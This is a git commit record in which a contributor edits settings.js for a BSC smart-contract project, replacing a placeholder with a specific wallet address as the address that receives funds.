99a172646f602c5a08526bf0905befcd83bf5024
Ptzec <111164775+Ptzec@users.noreply.github.com>
2022-08-12 21:59:45 -0500

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xCC985D691f6C84beBEb4dA531b1446aa31f7Faee";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
